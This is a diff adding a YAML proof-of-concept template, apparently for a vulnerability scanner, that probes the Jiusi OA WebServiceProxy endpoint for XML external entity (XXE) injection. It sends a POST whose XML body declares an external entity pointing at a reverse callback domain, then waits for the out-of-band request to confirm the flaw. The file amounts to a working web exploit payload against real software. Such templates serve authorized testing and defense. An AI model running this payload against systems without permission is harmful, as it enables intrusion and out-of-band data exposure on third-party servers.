@@ -1,0 +1,28 @@
+name: poc-yaml-jiusiOA-WebServiceProxy-XXE
+transport: http
+
+
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /jsoa/WebServiceProxy
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+       <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{reverseDomain}}"> %remote;]>
+
+    expression: reverse.wait(1)
+expression: r0()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486486&idx=1&sn=f760741dbe7dbe41fcc8c5df70c75c02&chksm=c267b925f5103033d97a82f7593c17340a651040e7b0928ac8355ecc813ed2903ba02eb2b0b2&token=1628549949&lang=zh_CN#rd
